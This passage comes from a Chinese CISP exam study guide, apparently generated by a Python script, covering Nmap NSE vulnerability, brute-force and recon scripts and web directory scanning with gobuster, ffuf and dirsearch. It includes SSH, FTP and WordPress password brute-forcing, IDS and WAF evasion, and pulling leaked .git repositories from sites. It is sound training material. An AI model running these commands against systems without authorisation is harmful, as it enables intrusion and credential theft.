# SQL注入检测
nmap -p 80 --script http-sql-injection --script-args 'http-sql-injection.uri=/page.php?id=1' 192.168.1.100

# Vulners脚本（综合漏洞信息）
nmap -sV --script vulners 192.168.1.100
# 自动查询vulners.com数据库，匹配已知漏洞
```

### 3.3 数据库漏洞检测

```bash
# MySQL
nmap -p 3306 --script mysql-* 192.168.1.100
nmap -p 3306 --script mysql-empty-password 192.168.1.100  # 空密码
nmap -p 3306 --script mysql-vuln-cve2012-2122 192.168.1.100 # 认证绕过

# MSSQL
nmap -p 1433 --script ms-sql-* 192.168.1.100
nmap -p 1433 --script ms-sql-info 192.168.1.100

# PostgreSQL
nmap -p 5432 --script pgsql-brute 192.168.1.100

# Redis
nmap -p 6379 --script redis-info 192.168.1.100  # 未授权访问检测

# MongoDB
nmap -p 27017 --script mongodb-info 192.168.1.100
```

---

## 四、暴力破解脚本实战

### 4.1 SSH暴力破解

```bash
# SSH暴力破解
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.100

# 指定超时时间
nmap -p 22 --script ssh-brute --script-args 'brute.threads=10,brute.delay=1s' 192.168.1.100

# 检测SSH认证方式
nmap -p 22 --script ssh-auth-methods 192.168.1.100
# 检查是否允许密码认证或公钥认证

# SSH主机密钥
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 192.168.1.100
nmap -p 22 --script ssh2-enum-algos 192.168.1.100  # 枚举支持的算法
```

### 4.2 FTP暴力破解

```bash
# FTP暴力破解
nmap -p 21 --script ftp-brute --script-args userdb=users.txt,passdb=passwords.txt 192.168.1.100

# FTP匿名登录检测
nmap -p 21 --script ftp-anon 192.168.1.100

# FTP信息收集
nmap -p 21 --script ftp-* 192.168.1.100
```

### 4.3 HTTP认证暴力破解

```bash
# HTTP基础认证暴力破解
nmap -p 80 --script http-brute --script-args 'http-brute.path=/admin/' 192.168.1.100

# WordPress暴力破解
nmap -p 80 --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwords.txt,http-wordpress-brute.threads=5' 192.168.1.100

# Joomla暴力破解
nmap -p 80 --script http-joomla-brute 192.168.1.100

# 通用表单暴力破解
nmap -p 80 --script http-form-brute --script-args 'http-form-brute.path=/login.php' 192.168.1.100
```

---

## 五、信息收集脚本实战

### 5.1 Web信息收集

```bash
# HTTP头分析
nmap -p 80,443 --script http-headers 192.168.1.100
# 检查安全头：CSP, HSTS, X-Frame-Options, X-XSS-Protection

# Web技术栈识别
nmap -p 80,443 --script http-waf-detect --script-args='http-waf-detect.uri=/test.php?id=1' 192.168.1.100
nmap -p 80,443 --script http-waf-fingerprint 192.168.1.100

# 获取网页标题
nmap -p 80,443 --script http-title 192.168.1.0/24

# Web目录枚举
nmap -p 80,443 --script http-enum 192.168.1.100
nmap -p 80,443 --script http-enum --script-args http-enum.fingerprintfile=./fingerprints.txt 192.168.1.100

# 发现虚拟主机
nmap -p 80,443 --script http-vhosts 192.168.1.100

# Robots.txt分析
nmap -p 80,443 --script http-robots.txt 192.168.1.100

# 敏感文件检测
nmap -p 80,443 --script http-git,http-svn-enum,http-backup-finder 192.168.1.100
```

### 5.2 SSL/TLS信息收集

```bash
# SSL证书信息
nmap -p 443 --script ssl-cert 192.168.1.100

# 加密算法枚举
nmap -p 443 --script ssl-enum-ciphers 192.168.1.100
# 检查是否支持弱加密算法：RC4, 3DES, NULL

# SSL/TLS版本检测
nmap -p 443 --script ssl-enum-ciphers --script-args tls.version=all 192.168.1.100

# 获取证书链
nmap -p 443 --script ssl-cert --script-args tls.servername=example.com 192.168.1.100
```

### 5.3 DNS信息收集

```bash
# DNS区域传送
nmap -p 53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=example.com 192.168.1.100

# DNS服务发现
nmap --script broadcast-dns-service-discovery

# DNS随机子域名枚举
nmap -p 53 --script dns-brute --script-args dns-brute.domain=example.com,dns-brute.threads=10 192.168.1.100

# DNS缓存探针
nmap -sU -p 53 --script dns-cache-snoop --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={{host1,host2,host3}}' 192.168.1.100
```

---

## 六、自定义NSE脚本开发

### 6.1 NSE脚本结构

```lua
-- 自定义NSE脚本模板
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
自定义Nmap脚本：检测目标Web服务器是否使用了特定框架
示例：检测Laravel框架
]]

author = "Pentester"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {{"discovery", "safe"}}

-- 脚本规则：仅在HTTP/HTTPS端口执行
portrule = shortport.port_or_service({{80, 443}}, {{"http", "https"}})

-- 核心执行函数
action = function(host, port)
    local result = ""
    local socket = nmap.new_socket()
    
    -- 建立连接
    local status, err = socket:connect(host, port)
    if not status then
        return "连接失败: " .. err
    end
    
    -- 发送HTTP请求
    local request = "GET / HTTP/1.1\\r\\nHost: " .. host.ip .. "\\r\\n\\r\\n"
    socket:send(request)
    
    -- 接收响应
    local response = ""
    while true do
        local status, data = socket:receive()
        if not status then break end
        response = response .. data
    end
    
    socket:close()
    
    -- 分析响应
    if string.find(response:lower(), "laravel") then
        result = "检测到Laravel框架"
    end
    
    return result
end
```

### 6.2 NSE库函数

```lua
-- 常用NSE库
local http = require "http"       -- HTTP请求库
local smb = require "smb"         -- SMB协议库
local ssh2 = require "ssh2"       -- SSH协议库
local sslcert = require "sslcert" -- SSL证书库
local vulns = require "vulns"     -- 漏洞报告库
local brute = require "brute"     -- 暴力破解引擎
local json = require "json"       -- JSON解析
local base64 = require "base64"   -- Base64编解码

-- HTTP GET请求示例
local response = http.get(host, port, "/api/version")

-- HTTP POST请求示例
local options = {{
    header = {{
        ["Content-Type"] = "application/x-www-form-urlencoded"
    }},
    content = "username=admin&password=admin"
}}
local response = http.post(host, port, "/login", options)
```

---

## 七、Nmap Diff功能

### 7.1 NDiff简介

NDiff是Nmap自带的扫描结果对比工具，用于发现网络变化：

```bash
# 基线扫描
nmap -sV -oX baseline.xml 192.168.1.0/24

# 后续扫描
nmap -sV -oX current.xml 192.168.1.0/24

# 对比两次扫描结果
ndiff baseline.xml current.xml
ndiff --verbose baseline.xml current.xml

# 输出示例：
# +192.168.1.50 is up. Added 1 open port: 8080/tcp
# -192.168.1.30 is down.
# 192.168.1.100: Changed OS details
```

### 7.2 NDiff持续监控

```bash
# 定期扫描脚本
#!/bin/bash
# network_monitor.sh
BASELINE_DIR="/opt/nmap/baselines"
REPORT_DIR="/opt/nmap/reports"
DATE=$(date +%Y%m%d)

# 首次运行建立基线
if [ ! -f "$BASELINE_DIR/baseline.xml" ]; then
    nmap -sV -oX "$BASELINE_DIR/baseline.xml" 192.168.1.0/24
    echo "Baseline created"
    exit
fi

# 执行当前扫描
nmap -sV -oX "$REPORT_DIR/scan_$DATE.xml" 192.168.1.0/24

# 对比变化
ndiff "$BASELINE_DIR/baseline.xml" "$REPORT_DIR/scan_$DATE.xml" > "$REPORT_DIR/changes_$DATE.txt"

# 如果有变化，发送告警
if [ -s "$REPORT_DIR/changes_$DATE.txt" ]; then
    cat "$REPORT_DIR/changes_$DATE.txt" | mail -s "Network Changes Detected" admin@example.com
fi
```

---

## 八、Nmap与NDiff持续监控

### 8.1 Nmap扫描策略设计

```bash
# 分层扫描策略
# Layer 1: 每周一次全面扫描（深度）
nmap -sS -sV -O -sC -p- -T4 -oA weekly_full 192.168.1.0/24

# Layer 2: 每天一次快速扫描（广度）
nmap -sS -sV -T4 --top-ports 1000 -oA daily_quick 192.168.1.0/24

# Layer 3: 每小时关键服务监控
nmap -sS -p 22,80,443,3389 -oA hourly_critical 192.168.1.100

# 使用cron自动化
# 0 2 * * 0 /opt/scripts/weekly_scan.sh    # 每周日凌晨2点
# 0 6 * * * /opt/scripts/daily_scan.sh     # 每天早上6点
# 0 * * * * /opt/scripts/hourly_scan.sh    # 每小时
```

### 8.2 大规模扫描策略

```bash
# 分布式扫描
# Master节点负责协调
nmap -sL 10.0.0.0/8 --exclude 10.0.0.0/16 -oN exclude.txt

# 多台扫描节点并行工作
# Node1: nmap -sS -p- -oX node1.xml 10.1.0.0/16
# Node2: nmap -sS -p- -oX node2.xml 10.2.0.0/16
# Node3: nmap -sS -p- -oX node3.xml 10.3.0.0/16

# 合并结果
# 使用Python脚本合并XML输出
```

---

## 九、Nmap高级扫描策略

### 9.1 全端口综合扫描

```bash
# 全面但隐蔽的扫描策略
# Step 1: 用Masscan快速发现端口
masscan -p1-65535 --rate=5000 --open -oG masscan.gnmap 192.168.1.100

# Step 2: 提取端口，Nmap精细扫描
ports=$(grep "Host:" masscan.gnmap | head -1 | grep -oP '(?<=Ports: ).*' | tr ',' '\\n' | cut -d'/' -f1 | tr '\\n' ',')
nmap -sV -sC -O -p $ports 192.168.1.100 -oN full_scan.txt

# Step 3: 针对性脚本扫描
nmap -p 80,443 --script "http-* and safe" 192.168.1.100 -oN web_scan.txt
nmap -p 445 --script "smb-* and safe" 192.168.1.100 -oN smb_scan.txt
nmap -p 22 --script "ssh-* and safe" 192.168.1.100 -oN ssh_scan.txt
```

### 9.2 特定场景扫描

```bash
# 场景1：快速评估（5分钟内完成）
nmap -T4 -F -sV --version-light 192.168.1.0/24

# 场景2：隐秘扫描（IDS规避优先）
nmap -sS -T2 -f --data-length 24 -D RND:5 --randomize-hosts -n -p 1-1000 192.168.1.100

# 场景3：穿透防火墙
nmap -sA -Pn -n 192.168.1.100              # ACK扫描检测防火墙规则
nmap -sS -g 80 -f --mtu 24 192.168.1.100   # 伪装成HTTP流量

# 场景4：内网扫描
nmap -PR -sn 192.168.1.0/24                # ARP发现（最快）
nmap -sS -T4 -p 445,135,139,3389 192.168.1.0/24  # Windows主机发现
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | NSE脚本分类 | ★★★★ | ★★ | auth/brute/default/discovery/exploit/vuln等 |
| 2 | -sC等价 | ★★★★ | ★ | --script=default |
| 3 | 脚本选择语法 | ★★★ | ★★ | 通配符、逻辑运算符、分类名 |
| 4 | SMB漏洞检测 | ★★★★ | ★★ | smb-vuln-ms17-010, smb-os-discovery |
| 5 | 暴力破解脚本 | ★★★ | ★★ | ssh-brute, ftp-brute, http-brute |
| 6 | NDiff功能 | ★★★ | ★★ | 对比两次扫描结果，发现网络变化 |
| 7 | 脚本参数传递 | ★★★ | ★★ | --script-args |
| 8 | Lua编写NSE | ★★ | ★★★ | 自定义脚本开发 |
| 9 | Vulners脚本 | ★★★ | ★★ | 查询已知漏洞数据库 |
| 10 | 扫描阶段 | ★★★ | ★★ | prerule/hostrule/portrule/postrule |

### 💡 知识巧记口诀

> **"NSE四阶段"** — prerule（扫描前）、hostrule（每主机）、portrule（每端口）、postrule（扫描后）。记住：**"前主端后"**。

> **"漏洞检测三类重点"** — SMB（smb-vuln-*）、SSL（ssl-*）、HTTP（http-*）。记住：**"SMB看永恒之蓝，SSL看心脏滴血，HTTP看ShellShock"**。

> **"暴力破解三件套"** — 字典文件（userdb/passdb）、线程数（threads）、延迟（delay）。记住：**"字典线程加延迟"**。

### 🎯 考试陷阱提醒

| 陷阱 | 正确理解 |
|:---|:---|
| "-sC等于--script=all" | ❌ 错误！-sC = --script=default，不是所有脚本 |
| "NSE脚本只能用Lua写" | ✅ 正确！NSE脚本必须用Lua编写 |
| "vuln脚本不会造成危害" | ❌ 错误！vuln分类中有些脚本有攻击性 |
| "--script参数只能接受一个脚本" | ❌ 错误！可以使用通配符和逻辑表达式 |
| "NDiff只能对比端口变化" | ❌ 错误！NDiff可对比端口、服务、OS、主机状态等 |

---

## 学习建议

1. 📚 **通读NSE脚本文档**：至少浏览一遍 /usr/share/nmap/scripts/ 下的所有脚本名称
2. 🔬 **动手编写NSE脚本**：尝试编写一个简单的HTTP信息收集脚本
3. 🧪 **在靶机上测试漏洞脚本**：在Metasploitable2上测试 smb-vuln-ms08-067 等漏洞脚本
4. 📊 **建立持续监控机制**：学习使用NDiff进行网络变化监控
5. 🛠️ **掌握脚本调试技巧**：使用 -d 参数查看脚本调试信息

---

> **Nmap的真正威力不在于扫描速度，而在于NSE脚本引擎的无限扩展性。会写NSE脚本的渗透测试工程师，和只会用现成脚本的工程师，差距是数量级的。**
""")

# ===================================================================
# Day 6：Web目录扫描
# ===================================================================
gen('day-6.md', """# Day 6：Web目录扫描

> **📘 文档定位**：CISP 考试核心基础 | 难度：入门 | 预计阅读：40 分钟
>
> Web目录扫描是渗透测试中最基础也最重要的环节之一。Web应用往往隐藏着管理后台、备份文件、测试页面、API文档、配置文件等敏感资源。通过系统化的目录和文件扫描，能发现大量被遗忘的攻击入口。一个隐藏的 /admin/ 或 /.git/ 可能直接导致整个系统沦陷。

---

## 导航目录

- [一、Web目录扫描概述](#一web目录扫描概述)
- [二、Dirb目录扫描](#二dirb目录扫描)
- [三、Gobuster目录扫描](#三gobuster目录扫描)
- [四、FFUF现代模糊测试](#四ffuf现代模糊测试)
- [五、Dirsearch专业目录扫描](#五dirsearch专业目录扫描)
- [六、特殊文件发现技术](#六特殊文件发现技术)
- [七、API端点发现](#七api端点发现)
- [八、扫描结果自动化分析](#八扫描结果自动化分析)
- [九、目录扫描对抗与绕过](#九目录扫描对抗与绕过)
- [十、高分考点与知识巧记](#十高分考点与知识巧记)

---

## 一、Web目录扫描概述

### 1.1 为什么需要目录扫描

Web应用的安全往往取决于"攻击面"的大小。攻击面不仅仅是可见的页面，还包括：

```
Web应用攻击面全景：
├── 公开页面
│   ├── 首页、产品页、关于我们
│   └── 新闻、博客、联系方式
├── 隐藏功能（目录扫描重点发现）
│   ├── /admin/ — 管理后台
│   ├── /backup/ — 备份文件
│   ├── /api/ — API接口
│   ├── /dev/ — 开发环境
│   ├── /test/ — 测试页面
│   ├── /staging/ — 预发布环境
│   └── /console/ — 调试控制台
├── 配置文件泄露
│   ├── /.env, /config.php.bak
│   ├── /web.config, /.htaccess
│   └── /.git/, /.svn/
├── 已知漏洞路径
│   ├── /phpmyadmin/
│   ├── /wp-admin/
│   └── /jenkins/
└── 信息泄露路径
    ├── /phpinfo.php
    ├── /server-status
    └── /actuator/ (Spring Boot)
```

### 1.2 目录扫描工具对比

| 工具 | 语言 | 速度 | 功能特点 | 适用场景 |
|:---|:---|:---|:---|:---|
| Dirb | C | 快 | 基础目录枚举 | 快速初筛 |
| Gobuster | Go | 极快 | 并发高、多模式 | 大规模扫描 |
| FFUF | Go | 极快 | 现代、灵活、支持过滤器 | 专业级扫描 |
| Dirsearch | Python | 中 | 功能全面、递归扫描 | 深度枚举 |
| Dirbuster | Java | 慢 | GUI界面 | 新手友好 |
| Wfuzz | Python | 中 | 功能强大、支持Payload | 模糊测试 |

### 1.3 字典选择策略

```bash
# 字典分类
# 小型字典（快速扫描）
/usr/share/wordlists/dirb/common.txt           # 约4600条
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  # 约8万条

# 中型字典
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt # 约22万条
/usr/share/seclists/Discovery/Web-Content/common.txt         # 约4600条

# 大型字典
/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-big.txt # 约100万条
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

# 专用字典
/usr/share/seclists/Discovery/Web-Content/CMS/        # CMS专用
/usr/share/seclists/Discovery/Web-Content/api.txt     # API端点
/usr/share/seclists/Discovery/Web-Content/backup.txt  # 备份文件
```

> **🔑 高分考点**：目录扫描的核心三要素：**字典质量**（决定发现率）、**扫描速度**（影响隐蔽性）、**状态码分析**（准确判断）。

---

## 二、Dirb目录扫描

### 2.1 Dirb基础用法

```bash
# 基础扫描
dirb https://target.com

# 指定字典
dirb https://target.com /usr/share/wordlists/dirb/big.txt

# 指定文件扩展名
dirb https://target.com -X .php,.asp,.aspx,.jsp,.bak,.old,.zip,.tar.gz

# 多线程
dirb https://target.com -t 50

# 递归扫描
dirb https://target.com -r -z 1000

# 自定义请求头
dirb https://target.com -H "Cookie: session=abc123"
dirb https://target.com -H "Authorization: Bearer token123"

# 代理扫描
dirb https://target.com -p http://127.0.0.1:8080

# 忽略特定状态码
dirb https://target.com -N 404,403

# 输出结果
dirb https://target.com -o dirb_results.txt
dirb https://target.com -a "Mozilla/5.0" -o results.txt
```

### 2.2 Dirb高级技巧

```bash
# 使用用户名密码认证
dirb https://target.com -u admin:password

# 不递归但深入一层
dirb https://target.com/admin/ -w

# 区分大小写扫描
dirb https://target.com -S

# 静默模式（仅输出结果）
dirb https://target.com -w

# 交互式（每发现一个暂停）
dirb https://target.com -i

# 自定义404检测
dirb https://target.com -N 404 -E "Not Found"
```

---

## 三、Gobuster目录扫描

### 3.1 Gobuster基础用法

```bash
# 安装
sudo apt install gobuster

# 目录扫描模式 (dir)
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# DNS子域名模式 (dns)
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# VHOST虚拟主机模式
gobuster vhost -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# S3存储桶模式
gobuster s3 -w bucket-names.txt

# 指定线程数
gobuster dir -u https://target.com -w common.txt -t 50

# 指定扩展名
gobuster dir -u https://target.com -w common.txt -x php,html,txt,bak,zip

# 指定状态码
gobuster dir -u https://target.com -w common.txt -s "200,204,301,302,307,401,403"

# 排除状态码
gobuster dir -u https://target.com -w common.txt -b 404,400

# 指定输出文件
gobuster dir -u https://target.com -w common.txt -o gobuster_results.txt
```

### 3.2 Gobuster高级用法

```bash
# 自定义User-Agent
gobuster dir -u https://target.com -w common.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# 使用Cookie
gobuster dir -u https://target.com -w common.txt -c "PHPSESSID=abc123"

# 跟随重定向
gobuster dir -u https://target.com -w common.txt -f

# 忽略SSL证书错误
gobuster dir -u https://target.com -w common.txt -k

# 设置超时
gobuster dir -u https://target.com -w common.txt --timeout 10s

# 设置延迟
gobuster dir -u https://target.com -w common.txt --delay 500ms

# 使用代理
gobuster dir -u https://target.com -w common.txt -p http://127.0.0.1:8080

# 显示完整URL
gobuster dir -u https://target.com -w common.txt --fullurl

# 不显示进度
gobuster dir -u https://target.com -w common.txt -q

# 使用HTTP基本认证
gobuster dir -u https://target.com -w common.txt -U admin -P password

# 输出格式（CSV, JSON, HTML）
gobuster dir -u https://target.com -w common.txt -o results.csv --format csv
```

### 3.3 Gobuster性能调优

```bash
# 高并发扫描（内网）
gobuster dir -u https://target.com -w big.txt -t 100 --no-tls-validation

# 隐蔽扫描（低延迟）
gobuster dir -u https://target.com -w common.txt -t 5 --delay 1s

# 使用管道进行实时过滤
gobuster dir -u https://target.com -w common.txt -q | grep "Status: 200" > results_200.txt

# 结合httpx验证存活
gobuster dir -u https://target.com -w common.txt -q --fullurl | awk '{{print $1}}' | httpx -silent
```

---

## 四、FFUF现代模糊测试

### 4.1 FFUF概述

FFUF（Fuzz Faster U Fool）是用Go语言编写的现代Web模糊测试工具，支持目录、文件、参数、子域名、虚拟主机等多种模式的模糊测试：

```bash
# 安装
go install github.com/ffuf/ffuf@latest
sudo apt install ffuf
```

### 4.2 FFUF目录扫描

```bash
# 基础目录扫描
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt

# 指定扩展名
ffuf -u https://target.com/FUZZ -w common.txt -e .php,.html,.bak,.zip

# 过滤响应大小
ffuf -u https://target.com/FUZZ -w common.txt -fs 0,1234

# 过滤响应字数
ffuf -u https://target.com/FUZZ -w common.txt -fw 50

# 过滤响应行数
ffuf -u https://target.com/FUZZ -w common.txt -fl 20

# 匹配状态码
ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,302,403

# 过滤状态码
ffuf -u https://target.com/FUZZ -w common.txt -fc 404,400

# 正则匹配响应
ffuf -u https://target.com/FUZZ -w common.txt -mr "admin"

# 正则过滤响应
ffuf -u https://target.com/FUZZ -w common.txt -fr "Not Found"

# 递归扫描
ffuf -u https://target.com/FUZZ -w common.txt -recursion -recursion-depth 2

# 多位置FUZZ
ffuf -u https://target.com/FUZZ/user/FUZZ2 -w dirs.txt:FUZZ -w files.txt:FUZZ2

# 多字典组合（笛卡尔积）
ffuf -u https://target.com/FUZZ/FUZZ2 -w dirs.txt:FUZZ -w files.txt:FUZZ2 -mode clusterbomb

# 多字典组合（一一对应）
ffuf -u https://target.com/FUZZ/FUZZ2 -w dirs.txt:FUZZ -w files.txt:FUZZ2 -mode pitchfork
```

### 4.3 FFUF高级功能

```bash
# 自定义请求头
ffuf -u https://target.com/FUZZ -w common.txt -H "User-Agent: Mozilla/5.0" -H "X-Custom: test"

# Cookie认证
ffuf -u https://target.com/FUZZ -w common.txt -b "session=abc123"

# HTTP方法
ffuf -u https://target.com/FUZZ -w common.txt -X POST -d "param=value"

# 延时和重试
ffuf -u https://target.com/FUZZ -w common.txt -p 0.5 -max-time 900

# 输出格式
ffuf -u https://target.com/FUZZ -w common.txt -o results.json -of json
ffuf -u https://target.com/FUZZ -w common.txt -o results.csv -of csv
ffuf -u https://target.com/FUZZ -w common.txt -o results.html -of html

# 恢复中断的扫描
ffuf -u https://target.com/FUZZ -w common.txt -o results.json -of json
# 中断后恢复
ffuf -input-cmd 'cat results.json | jq -r ".results[].input.FUZZ"' -u https://target.com/FUZZ

# 速率限制绕过
ffuf -u https://target.com/FUZZ -w common.txt -t 3 -p 1
```

---

## 五、Dirsearch专业目录扫描

### 5.1 Dirsearch安装与基础用法

```bash
# 安装
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip3 install -r requirements.txt

# 基础扫描
python3 dirsearch.py -u https://target.com

# 指定字典
python3 dirsearch.py -u https://target.com -w /usr/share/wordlists/dirb/big.txt

# 多扩展名
python3 dirsearch.py -u https://target.com -e php,asp,aspx,jsp,html,bak,zip,tar.gz

# 递归扫描
python3 dirsearch.py -u https://target.com -r --recursion-depth 3

# 多线程
python3 dirsearch.py -u https://target.com -t 30

# 延迟请求
python3 dirsearch.py -u https://target.com --delay 0.5
```

### 5.2 Dirsearch高级功能

```bash
# 代理扫描
python3 dirsearch.py -u https://target.com --proxy http://127.0.0.1:8080

# 自定义请求头
python3 dirsearch.py -u https://target.com --header "Authorization: Bearer token"
python3 dirsearch.py -u https://target.com --header "Cookie: session=abc"

# 排除状态码
python3 dirsearch.py -u https://target.com -x 404,400,500

# 包含状态码
python3 dirsearch.py -u https://target.com -i 200,301,302,403

# 指定HTTP方法
python3 dirsearch.py -u https://target.com -m POST

# 保存结果
python3 dirsearch.py -u https://target.com -o results.txt --format plain
python3 dirsearch.py -u https://target.com -o results.json --format json
python3 dirsearch.py -u https://target.com -o results.csv --format csv

# 静默模式
python3 dirsearch.py -u https://target.com -q

# 从文件批量扫描
python3 dirsearch.py -l targets.txt
```

---

## 六、特殊文件发现技术

### 6.1 备份文件发现

```bash
# 常见备份文件后缀
# .bak, .old, .backup, .save, .tmp, .swp, ~
# .php.bak, .php~, .php.save, .php.old
# config.php.bak, wp-config.php.old

# Gobuster扫描备份文件
gobuster dir -u https://target.com -w common.txt -x bak,old,backup,save,tmp,swp,~

# FFUF扫描备份文件
ffuf -u https://target.com/FUZZ -w common.txt -e .bak,.old,.backup,.save,.tmp,.swp,~

# 扫描配置文件
ffuf -u https://target.com/FUZZ -w config_files.txt
# 字典内容：.env, config.php, web.config, .htaccess, wp-config.php, settings.py, application.properties

# 检测.git泄露
curl https://target.com/.git/HEAD
# 如果返回 ref: refs/heads/master，说明存在.git泄露

# 使用GitHacker下载.git
python3 GitHacker.py --url https://target.com/.git/ --output-folder target_git
```

### 6.2 源代码泄露检测

```bash
# .git泄露
wget -r --no-parent https://target.com/.git/
git checkout -- .

# .svn泄露
curl https://target.com/.svn/entries
# 使用svn-extractor
python3 svn-extractor.py --url https://target.com/.svn/

# .DS_Store泄露
curl https://target.com/.DS_Store
# 使用ds_store_exp解析
python3 ds_store_exp.py https://target.com/.DS_Store

# 源码文件泄露
# 扫描.php, .asp, .jsp, .py, .java源文件
gobuster dir -u https://target.com -w common.txt -x php,asp,aspx,jsp,py,java,class,rb,go
```

### 6.3 常见CMS路径发现

```bash
# WordPress
# /wp-admin, /wp-login.php, /wp-content, /wp-includes
# /wp-config.php, /wp-config.php.bak
# /xmlrpc.php, /wp-json/wp/v2/users

# Joomla
# /administrator, /components, /modules, /plugins
# /configuration.php, /configuration.php.bak

# Drupal
# /user/login, /admin, /node
# /sites/default/settings.php

# 通用CMS识别路径
/phpmyadmin/
/adminer.php
/jenkins/
/confluence/
/gitlab/
/console/ (AWS, GCP)
/_profiler/ (Symfony)
/actuator/ (Spring Boot)
/swagger-ui.html
/api-docs
/graphql
/.well-known/
```

---

## 七、API端点发现

### 7.1 API发现策略

```bash
# 常见API路径
/api/
/api/v1/
/api/v2/
/graphql
/query
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/swagger.json
/docs

# 使用FFUF扫描API端点
ffuf -u https://target.com/FUZZ -w api_common.txt

# 扫描Swagger文档
curl https://target.com/swagger.json
curl https://target.com/api-docs
curl https://target.com/v2/api-docs
curl https://target.com/v3/api-docs

# GraphQL发现
curl https://target.com/graphql -X POST -H "Content-Type: application/json" -d '{{"query":"{{__schema{{types{{name}}}}}}"}}'

# REST API模糊测试
ffuf -u https://target.com/api/v1/FUZZ -w api_endpoints.txt -H "Content-Type: application/json"
```

### 7.2 API参数发现

```bash
# Arjun - HTTP参数发现
python3 arjun.py -u https://target.com/page.php
python3 arjun.py -u https://target.com/api/endpoint --method POST

# ParamSpider
python3 paramspider.py -d target.com

# FFUF参数模糊测试
ffuf -u 'https://target.com/api?FUZZ=test' -w params.txt -fs 0
ffuf -u 'https://target.com/api' -X POST -d 'FUZZ=test' -w params.txt -fs 0

# 使用x8进行隐藏参数发现
x8 -u https://target.com/api -w params.txt
```

---

## 八、扫描结果自动化分析

### 8.1 结果处理脚本

```python
#!/usr/bin/env python3
# 目录扫描结果自动化分析
import re
import sys
from collections import defaultdict

def parse_gobuster_output(filepath):
    # 解析Gobuster输出
    results = defaultdict(list)
    with open(filepath) as f:
        for line in f:
            match = re.match(r'(/\\S+)\\s+\\(Status: (\\d+)\\)\\s+\\[Size: (\\d+)\\]', line)
            if match:
                path, status, size = match.groups()
                results[int(status)].append({{
                    'path': path,
                    'size': int(size)
                }})
    return results

def analyze_results(results):
    # 分析扫描结果，标记高风险发现
    high_risk_paths = [
        '/admin', '/backup', '/config', '/.git', '/.env',
        '/phpmyadmin', '/wp-admin', '/console', '/jenkins',
        '/actuator', '/debug', '/phpinfo.php', '/server-status'
    ]
    
    findings = {{'high': [], 'medium': [], 'info': []}}
    
    for status, paths in results.items():
        for item in paths:
            path = item['path']
            # 高风险：管理后台、配置文件
            if any(hp in path.lower() for hp in high_risk_paths):
                findings['high'].append(item)
            # 中风险：非200但可访问
            elif status in [401, 403]:
                findings['medium'].append(item)
            # 信息：200响应
            elif status == 200:
                findings['info'].append(item)
    
    return findings

# 生成HTML报告
def generate_report(findings, output_file):
    html = '''<html><head><title>目录扫描分析报告</title></head><body>
    <h1>目录扫描分析报告</h1>
    <h2>高风险发现</h2><ul>'''
    
    for item in findings['high']:
        html += f"<li><strong>{{item['path']}}</strong> ({{item['size']}} bytes)</li>"
    
    html += "</ul><h2>中风险发现</h2><ul>"
    for item in findings['medium']:
        html += f"<li>{{item['path']}}</li>"
    
    html += "</ul></body></html>"
    
    with open(output_file, 'w') as f:
        f.write(html)
```

### 8.2 多工具结果合并

```bash
# 多工具扫描并合并结果
# Step 1: 各工具独立扫描
gobuster dir -u https://target.com -w common.txt -o gobuster.txt
ffuf -u https://target.com/FUZZ -w common.txt -o ffuf.json -of json
dirsearch.py -u https://target.com -o dirsearch.txt

# Step 2: 合并去重
cat gobuster.txt dirsearch.txt | sort -u > all_results.txt

# Step 3: 提取200响应的路径
grep "200" all_results.txt | awk '{{print $1}}' > interesting_paths.txt

# Step 4: 使用httpx验证存活
cat interesting_paths.txt | httpx -silent -status-code -title -tech-detect -o verified.txt

# Step 5: 截图验证
cat interesting_paths.txt | aquatone -out aquatone_report/
```

---

## 九、目录扫描对抗与绕过

### 9.1 WAF/CDN绕过

```bash
# 使用不同User-Agent
gobuster dir -u https://target.com -w common.txt -a "Googlebot/2.1"

# 绕过速率限制
# 使用延迟 + 低线程
gobuster dir -u https://target.com -w common.txt -t 3 --delay 2s

# 使用代理池轮换
ffuf -u https://target.com/FUZZ -w common.txt -replay-proxy http://proxy:8080

# 大小写绕过（某些WAF只检测小写）
# 在字典中混入大小写变体

# HTTP方法绕过
ffuf -u https://target.com/FUZZ -w common.txt -X POST
ffuf -u https://target.com/FUZZ -w common.txt -X PUT

# 添加无害参数绕过缓存
ffuf -u 'https://target.com/FUZZ?cachebuster=random' -w common.txt
```

### 9.2 自定义404检测

```bash
# 处理始终返回200的站点
# Step 1: 先请求一个不存在的路径，获取基准响应
curl -s https://target.com/nonexistent_page_12345 | wc -c
# 假设基准大小为 5234

# Step 2: 过滤与基准大小相同的响应
ffuf -u https://target.com/FUZZ -w common.txt -fs 5234

# 处理自定义404页面
ffuf -u https://target.com/FUZZ -w common.txt -fr "Page not found"
ffuf -u https://target.com/FUZZ -w common.txt -fw 50

# 基于内容长度的过滤
ffuf -u https://target.com/FUZZ -w common.txt -fl 15
```

---

## 十、高分考点与知识巧记

### 📌 高分考点速查表

| 序号 | 考点 | 考试频率 | 难度 | 关键答案 |
|:---:|:---|:---:|:---:|:---|
| 1 | 目录扫描目的 | ★★★★ | ★ | 发现隐藏目录、备份文件、管理后台 |
